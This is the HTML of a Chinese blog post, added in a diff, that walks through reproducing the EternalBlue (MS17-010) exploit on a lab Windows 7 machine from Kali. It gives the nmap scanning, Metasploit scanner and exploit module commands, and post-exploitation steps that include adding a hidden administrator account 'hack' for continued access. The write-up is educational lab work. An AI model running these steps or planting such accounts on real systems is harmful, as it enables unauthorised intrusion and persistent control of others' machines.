@@ -1,0 +1,262 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width,initial-scale=1"><title>永恒之蓝 | 7kpad's blog</title><meta name="keywords" content="123123"><meta name="author" content="7kpad"><meta name="copyright" content="7kpad"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><meta name="description" content="永恒之蓝复现445端口简介：​    445端口是一个毁誉参半的端口，有了它我们可以在局域网中轻松访问各种共享文件夹或共享打印机，但也正是因为有了它，黑客们才有了可乘之机，他们能通过该端口偷偷共享你的硬盘，甚至会在悄无声息中将你的硬盘格式化掉! 2017年10月，由于病毒”坏兔子”来袭，国家互联网应急中心等安全机构建议用户及时关闭计算机以及网络设备上的445和139端口 。 前期准备win7：">
+<meta property="og:type" content="article">
+<meta property="og:title" content="永恒之蓝">
+<meta property="og:url" content="http://example.com/2021/03/12/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/index.html">
+<meta property="og:site_name" content="7kpad&#39;s blog">
+<meta property="og:description" content="永恒之蓝复现445端口简介：​    445端口是一个毁誉参半的端口，有了它我们可以在局域网中轻松访问各种共享文件夹或共享打印机，但也正是因为有了它，黑客们才有了可乘之机，他们能通过该端口偷偷共享你的硬盘，甚至会在悄无声息中将你的硬盘格式化掉! 2017年10月，由于病毒”坏兔子”来袭，国家互联网应急中心等安全机构建议用户及时关闭计算机以及网络设备上的445和139端口 。 前期准备win7：">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://ss1.bdstatic.com/70cFvXSh_Q1YnxGkpoWK1HF6hhy/it/u=3523376988,1285761647&fm=26&gp=0.jpg">
+<meta property="article:published_time" content="2021-03-12T08:34:32.000Z">
+<meta property="article:modified_time" content="2021-03-15T09:04:39.837Z">
+<meta property="article:author" content="7kpad">
+<meta property="article:tag" content="123123">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://ss1.bdstatic.com/70cFvXSh_Q1YnxGkpoWK1HF6hhy/it/u=3523376988,1285761647&fm=26&gp=0.jpg"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2021/03/12/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.css"><script>var GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: {"path":"search.xml","languages":{"hits_empty":"找不到您查询的内容：${query}"}},
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: true,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  ClickShowText: {"text":"7kpad,blog","fontSize":"15px"},
+  lightbox: 'mediumZoom',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#49b1f5","bgDark":"#121212","position":"bottom-left"},
+  justifiedGallery: {
+    js: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/js/jquery.justifiedGallery.min.js',
+    css: 'https://cdn.jsdelivr.net/npm/justifiedGallery/dist/css/justifiedGallery.min.css'
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isanchor: false
+};
+
+var saveToLocal = {
+  set: function setWithExpiry(key, value, ttl) {
+    const now = new Date()
+    const expiryDay = ttl * 86400000
+    const item = {
+      value: value,
+      expiry: now.getTime() + expiryDay,
+    }
+    localStorage.setItem(key, JSON.stringify(item))
+  },
+
+  get: function getWithExpiry(key) {
+    const itemStr = localStorage.getItem(key)
+
+    if (!itemStr) {
+      return undefined
+    }
+    const item = JSON.parse(itemStr)
+    const now = new Date()
+
+    if (now.getTime() > item.expiry) {
+      localStorage.removeItem(key)
+      return undefined
+    }
+    return item.value
+  }
+}</script><script id="config_change">var GLOBAL_CONFIG_SITE = { 
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2021-03-15 17:04:39'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(function () {  window.activateDarkMode = function () {
+    document.documentElement.setAttribute('data-theme', 'dark')
+    if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+    }
+  }
+  window.activateLightMode = function () {
+    document.documentElement.setAttribute('data-theme', 'light')
+   if (document.querySelector('meta[name="theme-color"]') !== null) {
+      document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+    }
+  }
+  const autoChangeMode = 'false'
+  const t = saveToLocal.get('theme')
+  if (autoChangeMode === '1') {
+    const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+    const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+    const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+    const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+    if (t === undefined) {
+      if (isLightMode) activateLightMode()
+      else if (isDarkMode) activateDarkMode()
+      else if (isNotSpecified || hasNoSupport) {
+        const now = new Date()
+        const hour = now.getHours()
+        const isNight = hour <= 6 || hour >= 18
+        isNight ? activateDarkMode() : activateLightMode()
+      }
+      window.matchMedia('(prefers-color-scheme: dark)').addListener(function (e) {
+        if (saveToLocal.get('theme') === undefined) {
+          e.matches ? activateDarkMode() : activateLightMode()
+        }
+      })
+    } else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else if (autoChangeMode === '2') {
+    const now = new Date()
+    const hour = now.getHours()
+    const isNight = hour <= 6 || hour >= 18
+    if (t === undefined) isNight ? activateDarkMode() : activateLightMode()
+    else if (t === 'light') activateLightMode()
+    else activateDarkMode()
+  } else {
+    if (t === 'dark') activateDarkMode()
+    else if (t === 'light') activateLightMode()
+  }const asideStatus = saveToLocal.get('aside-status')
+if (asideStatus !== undefined) {
+   if (asideStatus === 'hide') {
+     document.documentElement.classList.add('hide-aside')
+   } else {
+     document.documentElement.classList.remove('hide-aside')
+   }
+}})()</script><meta name="generator" content="Hexo 5.3.0"><link rel="alternate" href="/atom.xml" title="7kpad's blog" type="application/atom+xml">
+</head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="author-avatar"><img class="avatar-img" data-lazy-src="/img/tx.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data"><div class="data-item is-center"><div class="data-item-link"><a href="/archives/"><div class="headline">文章</div><div class="length-num">3</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/tags/"><div class="headline">标签</div><div class="length-num">1</div></a></div></div><div class="data-item is-center"><div class="data-item-link"><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div></div></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 文章</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fa-fw fas fa-comment-dots"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(https://ss1.bdstatic.com/70cFvXSh_Q1YnxGkpoWK1HF6hhy/it/u=3523376988,1285761647&amp;fm=26&amp;gp=0.jpg)"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">7kpad's blog</a></span><span id="menus"><div id="search_button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><i class="fa-fw fas fa-list"></i><span> 文章</span><i class="fas fa-chevron-down expand"></i></a><ul class="menus_item_child"><li><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></li><li><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 分类</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/messageboard/"><i class="fa-fw fa-fw fas fa-comment-dots"></i><span> 留言板</span></a></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><span class="close" id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></span></span></nav><div id="post-info"><h1 class="post-title">永恒之蓝</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-03-12T08:34:32.000Z" title="发表于 2021-03-12 16:34:32">2021-03-12</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2021-03-15T09:04:39.837Z" title="更新于 2021-03-15 17:04:39">2021-03-15</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/1/">1</a></span></div><div class="meta-secondline"> </div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="永恒之蓝复现"><a href="#永恒之蓝复现" class="headerlink" title="永恒之蓝复现"></a>永恒之蓝复现</h1><h4 id="445端口简介："><a href="#445端口简介：" class="headerlink" title="445端口简介："></a>445端口简介：</h4><p>​    445端口是一个<a target="_blank" rel="noopener" href="https://baike.so.com/doc/3928921-4123312.html">毁誉参半</a>的端口，有了它我们可以在<a target="_blank" rel="noopener" href="https://baike.so.com/doc/3165868-3336420.html">局域网</a>中轻松访问各种<a target="_blank" rel="noopener" href="https://baike.so.com/doc/6082394-6295494.html">共享文件夹</a>或共享打印机，但也正是因为有了它，<a target="_blank" rel="noopener" href="https://baike.so.com/doc/1571721-1661341.html">黑客</a>们才有了可乘之机，他们能通过该端口偷偷共享你的硬盘，甚至会在悄无声息中将你的硬盘<a target="_blank" rel="noopener" href="https://baike.so.com/doc/5408560-5646548.html">格式化</a>掉! 2017年10月，由于病毒”坏兔子”来袭，国家互联网应急中心等安全机构建议用户及时关闭计算机以及网络设备上的445和139端口 。</p>
+<h4 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h4><p>win7：  192.168.27.189</p>
+<p>kali：     192.168.27.13 </p>
+<h5 id="2-Nmap扫描存活端口-nmap-r-192-168-27-0-24"><a href="#2-Nmap扫描存活端口-nmap-r-192-168-27-0-24" class="headerlink" title="2.Nmap扫描存活端口 nmap -r 192.168.27.0/24"></a>2.Nmap扫描存活端口 <code>nmap -r 192.168.27.0/24</code></h5><p><img src= "/img/loading.gif" data-lazy-src="1606728478220-438d40e0-a50c-45ef-952c-a43f3d6c35ca.png" alt="image.png"></p>
+<p>探测到存活主机ip，并探测到开放445端口，而永恒之蓝利用的就是445端口的smb服务，操作系统溢出漏洞。</p>
+<p><img src= "/img/loading.gif" data-lazy-src="1606729053476-0e662a75-9a11-4291-b7a8-1c088bd33686.png" alt="image.png"></p>
+<p>这里可以得到两个工具，其中auxiliary/scanner/smb/smb_ms17_010是永恒之蓝扫描模块，exploit/windows/smb/ms17_010_eternalblue是永恒之蓝攻击代码，一般配合使用，前者先扫描，若显示有漏洞，再进行攻击。</p>
+<h6 id="3-使用ms17-010扫描模块，对靶机Win7进行扫描"><a href="#3-使用ms17-010扫描模块，对靶机Win7进行扫描" class="headerlink" title="3.**使用ms17-010扫描模块，对靶机Win7进行扫描**"></a><strong>3.**</strong>使用ms17-010扫描模块，对靶机Win7进行扫描**</h6><p>使用模块</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf&gt; use auxiliary&#x2F;scanner&#x2F;smb&#x2F;smb_ms17_010</span><br></pre></td></tr></table></figure>
+<p>设置目标ip或网段</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfauxiliary(scanner&#x2F;smb&#x2F;smb_ms17_010) &gt; set RHOSTS 192.168.27.129</span><br></pre></td></tr></table></figure>
+<p>执行扫描</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfauxiliary(scanner&#x2F;smb&#x2F;smb_ms17_010) &gt; run</span><br></pre></td></tr></table></figure>
+<p><img src= "/img/loading.gif" data-lazy-src="1606729427793-8638e068-4351-4b99-9674-41c54655a458.png" alt="image.png"></p>
+<p><strong>使用ms17-010攻击模块，对靶机Win7进行攻击</strong></p>
+<p>使用模块</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf&gt; use exploit&#x2F;windows&#x2F;smb&#x2F;ms17_010_eternalblue</span><br></pre></td></tr></table></figure>
+<p>设置攻击目标ip</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(windows&#x2F;smb&#x2F;ms17_010_eternalblue) &gt; set RHOST192.168.27.189</span><br></pre></td></tr></table></figure>
+<p>查看设置选项</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfexploit(windows&#x2F;smb&#x2F;ms17_010_eternalblue) &gt; show options</span><br></pre></td></tr></table></figure>
+<p><img src= "/img/loading.gif" data-lazy-src="1606729541729-939e4438-8830-4df1-96c8-7e0e35903b3c.png" alt="image.png"></p>
+<h6 id="执行攻击"><a href="#执行攻击" class="headerlink" title="执行攻击"></a>执行攻击</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfexploit(windows&#x2F;smb&#x2F;ms17_010_eternalblue) &gt; exploit</span><br></pre></td></tr></table></figure>
+<p><img src= "/img/loading.gif" data-lazy-src="1606734280611-0cf092e9-cc11-4b4a-a637-7489090f3e53.png" alt="image.png"></p>
+<p><img src= "/img/loading.gif" data-lazy-src="1606734313171-47b7899b-3c8b-4c8a-b22e-4fbe7230d334.png" alt="image.png"></p>
+<p><img src= "/img/loading.gif" data-lazy-src="1606734153606-ec958419-ed03-4397-ad50-8ace533fd183.png" alt="image.png"></p>
+<p>直接拿到Win7的Shell，之后便可以通过Shell对目标靶机进行控制。</p>
+<p><img src= "/img/loading.gif" data-lazy-src="1606736164385-33527133-2d08-4c30-93c7-51eff5b1fc4a.png" alt="image.png"></p>
+<p><img src= "/img/loading.gif" data-lazy-src="1606736263010-4cbfe68f-5db7-4543-a81e-e6ce660fe3b8.png" alt="image.png"></p>
+<p>1.显示远程主机系统信息：sysinfo</p>
+<p>2.查看用户身份：getuid</p>
+<p>3.对远程主机当前屏幕进行截图：screenshot</p>
+<p>net user hack 123456 /add    //在windows 7上创建一个hack的用户，以便下次访问</p>
+<p>   net localgroup administrators hack /add   //将hack加入到windows 7的本地管理员组中，以便获得更大权限</p>
+<p>   net user    //查看windows 7本地用户</p>
+<p>   net localgroup administrators    //查看windows 7本地管理员</p>
+<p><img src= "/img/loading.gif" data-lazy-src="1606736791561-949b1dfe-81d1-49d0-b20b-5a0498655863.png" alt="image.png"></p>
+<p> 由上图可以看出来，的确将hack添加到windows 7 中，这样可以方便下次继续访问</p>
+<p>​    自此，利用永恒之蓝漏洞攻击一台主机就结束了，现在只有一些低版本的电脑没有打ms17_010的补丁，windows7 以上版本几乎都没有这个漏洞了。</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="mailto:undefined">7kpad</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2021/03/12/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/">http://example.com/2021/03/12/永恒之蓝/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">7kpad's blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/123123/">123123</a></div><div class="post_share"><div class="social-share" data-image="https://ss1.bdstatic.com/70cFvXSh_Q1YnxGkpoWK1HF6hhy/it/u=3523376988,1285761647&amp;fm=26&amp;gp=0.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/social-share.js/dist/css/share.min.css"><script src="https://cdn.jsdelivr.net/npm/social-share.js/dist/js/social-share.min.js" defer></script></div></div><div class="post-reward"><div class="reward-button"><i class="fas fa-qrcode"></i> 打赏<div class="reward-main"><ul class="reward-all"><li class="reward-item"><a href="/img/wechat.jpg" target="_blank"><img class="post-qr-code-img" data-lazy-src="/img/wechat.jpg" alt="wechat"/></a><div class="post-qr-code-desc">wechat</div></li><li class="reward-item"><a href="/img/alipay.jpg" target="_blank"><img class="post-qr-code-img" data-lazy-src="/img/alipay.jpg" alt="alipay"/></a><div class="post-qr-code-desc">alipay</div></li></ul></div></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2021/03/12/11111/"><img class="prev-cover" data-lazy-src="https://ss3.bdstatic.com/70cFv8Sh_Q1YnxGkpoWK1HF6hhy/it/u=2544377084,275372641&amp;fm=26&amp;gp=0.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">11111</div></div></a></div><div class="next-post pull-right"><a href="/2020/12/21/hello-world/"><img class="next-cover" data-lazy-src="https://ss1.bdstatic.com/70cFvXSh_Q1YnxGkpoWK1HF6hhy/it/u=3523376988,1285761647&amp;fm=26&amp;gp=0.jpg" onerror="onerror=null;src='/img/404.jpg'"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Hello World</div></div></a></div></nav><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside_content" id="aside_content"><div class="card-widget card-info"><div class="card-content"><div class="card-info-avatar is-center"><img class="avatar-img" data-lazy-src="/img/tx.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/><div class="author-info__name">7kpad</div><div class="author-info__description">个人简介</div></div><div class="card-info-data"><div class="card-info-data-item is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">3</div></a></div><div class="card-info-data-item is-center"><a href="/tags/"><div class="headline">标签</div><div class="length-num">1</div></a></div><div class="card-info-data-item is-center"><a href="/categories/"><div class="headline">分类</div><div class="length-num">1</div></a></div></div><a class="button--animated" id="card-info-btn" href="mailto:2723901951@qq.com"><i class="fab fa-email"></i><span>我的邮箱</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/yuyi7miao-xhn" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="https://wpa.qq.com/msgrd?v=3&amp;uin=2723901951&amp;site=qq&amp;menu=yes" target="_blank" title="QQ"><i class="fab fa-qq"></i></a><a class="social-icon" href="mailto:2723901951@gmail.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div></div><div class="card-widget card-announcement"><div class="card-content"><div class="item-headline"><i class="fas fa-bullhorn card-announcement-animation"></i><span>公告</span></div><div class="announcement_content">林深时见鹿，海蓝时见鲸</div></div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="card-content"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.</span> <span class="toc-text">永恒之蓝复现</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#445%E7%AB%AF%E5%8F%A3%E7%AE%80%E4%BB%8B%EF%BC%9A"><span class="toc-number">1.0.0.1.</span> <span class="toc-text">445端口简介：</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%89%8D%E6%9C%9F%E5%87%86%E5%A4%87"><span class="toc-number">1.0.0.2.</span> <span class="toc-text">前期准备</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#2-Nmap%E6%89%AB%E6%8F%8F%E5%AD%98%E6%B4%BB%E7%AB%AF%E5%8F%A3-nmap-r-192-168-27-0-24"><span class="toc-number">1.0.0.2.1.</span> <span class="toc-text">2.Nmap扫描存活端口 nmap -r 192.168.27.0&#x2F;24</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#3-%E4%BD%BF%E7%94%A8ms17-010%E6%89%AB%E6%8F%8F%E6%A8%A1%E5%9D%97%EF%BC%8C%E5%AF%B9%E9%9D%B6%E6%9C%BAWin7%E8%BF%9B%E8%A1%8C%E6%89%AB%E6%8F%8F"><span class="toc-number">1.0.0.2.1.1.</span> <span class="toc-text">3.**使用ms17-010扫描模块，对靶机Win7进行扫描**</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E6%89%A7%E8%A1%8C%E6%94%BB%E5%87%BB"><span class="toc-number">1.0.0.2.1.2.</span> <span class="toc-text">执行攻击</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></li></ol></div></div></div><div class="card-widget card-recent-post"><div class="card-content"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2021/03/12/11111/" title="11111"><img data-lazy-src="https://ss3.bdstatic.com/70cFv8Sh_Q1YnxGkpoWK1HF6hhy/it/u=2544377084,275372641&amp;fm=26&amp;gp=0.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="11111"/></a><div class="content"><a class="title" href="/2021/03/12/11111/" title="11111">11111</a><time datetime="2021-03-12T08:43:16.000Z" title="发表于 2021-03-12 16:43:16">2021-03-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2021/03/12/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/" title="永恒之蓝"><img data-lazy-src="https://ss1.bdstatic.com/70cFvXSh_Q1YnxGkpoWK1HF6hhy/it/u=3523376988,1285761647&amp;fm=26&amp;gp=0.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="永恒之蓝"/></a><div class="content"><a class="title" href="/2021/03/12/%E6%B0%B8%E6%81%92%E4%B9%8B%E8%93%9D/" title="永恒之蓝">永恒之蓝</a><time datetime="2021-03-12T08:34:32.000Z" title="发表于 2021-03-12 16:34:32">2021-03-12</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2020/12/21/hello-world/" title="Hello World"><img data-lazy-src="https://ss1.bdstatic.com/70cFvXSh_Q1YnxGkpoWK1HF6hhy/it/u=3523376988,1285761647&amp;fm=26&amp;gp=0.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Hello World"/></a><div class="content"><a class="title" href="/2020/12/21/hello-world/" title="Hello World">Hello World</a><time datetime="2020-12-21T09:12:53.338Z" title="发表于 2020-12-21 17:12:53">2020-12-21</time></div></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(https://ss1.bdstatic.com/70cFvXSh_Q1YnxGkpoWK1HF6hhy/it/u=3523376988,1285761647&amp;fm=26&amp;gp=0.jpg)"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2021 By 7kpad</div><div class="footer_custom_text">7kpad</div><div class="icp"><a target="_blank" rel="noopener" href="http://beian.miit.gov.cn/"><img class="icp-icon" src="/img/icp.png" alt="ICP"/><span>津ICP备2020010170号</span></a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat_btn" type="button" title="rightside.chat_btn"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><div class="search-dialog__title" id="local-search-title">本地搜索</div><div id="local-input-panel"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div></div><hr/><div id="local-search-results"><div id="local-hits"></div><div id="local-stats"><div class="local-search-stats__hr" id="hr"><span>由</span> <a target="_blank" rel="noopener" href="https://github.com/wzpan/hexo-generator-search" style="color:#49B1F5;">hexo-generator-search</a>
+ <span>提供支持</span></div></div></div><span class="search-close-button"><i class="fas fa-times"></i></span></div><div id="search-mask"></div></div><div><script src="https://cdn.jsdelivr.net/npm/jquery@latest/dist/jquery.min.js"></script><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/medium-zoom/dist/medium-zoom.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module" defer></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><script src="https://cdn.jsdelivr.net/npm/node-snackbar/dist/snackbar.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>function loadValine () {
+  function initValine () {
+    let initData = {
+      el: '#vcomment',
+      appId: '',
+      appKey: '',
+      placeholder: 'Please leave your footprints',
+      avatar: 'monsterid',
+      meta: 'nick,mail,link'.split(','),
+      pageSize: '10',
+      lang: 'zh-CN',
+      recordIP: false,
+      serverURLs: '',
+      emojiCDN: '',
+      emojiMaps: "",
+      enableQQ: false,
+      path: window.location.pathname,
+    }
+
+    if (true) { 
+      initData.requiredFields= ('nick,mail'.split(','))
+    }
+    
+    if (false) {
+      const otherData = false
+      initData = Object.assign({}, initData, otherData)
+    }
+    
+    const valine = new Valine(initData)
+  }
+
+  if (typeof Valine === 'function') initValine() 
+  else $.getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js', initValine)
+}
+
+if ('Valine' === 'Valine' || !false) {
+  if (false) btf.loadComment(document.querySelector('#vcomment'),loadValine)
+  else setTimeout(() => loadValine(), 0)
+} else {
+  function loadOtherComment () {
+    loadValine()
+  }
+}</script></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="0.5" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/canvas-nest.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = true;
+POWERMODE.shake = false;
+POWERMODE.mobile = true;
+document.body.addEventListener('input', POWERMODE);
+</script><script id="click-show-text" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1/dist/click-show-text.min.js" async="async" mobile="false"></script><script>(function(d, w, c) {
+    w.ChatraID = '';
+    var s = d.createElement('script');
+    w[c] = w[c] || function() {
+        (w[c].q = w[c].q || []).push(arguments);
+    };
+    s.async = true;
+    s.src = 'https://call.chatra.io/chatra.js';
+    if (d.head) d.head.appendChild(s);
+})(document, window, 'Chatra');
+
+if (true) {
+  var chatBtnFn = () => {
+    var chatBtn = document.getElementById("chat_btn")
+    chatBtn.addEventListener("click", function(){
+      Chatra('openChat')
+    });
+  }
+  chatBtnFn()
+} else {
+  if (true) {
+    function chatBtnHide () {
+      Chatra('hide')
+    }
+    function chatBtnShow () {
+      Chatra('show')
+    }
+  }
+}</script></div></body></html>
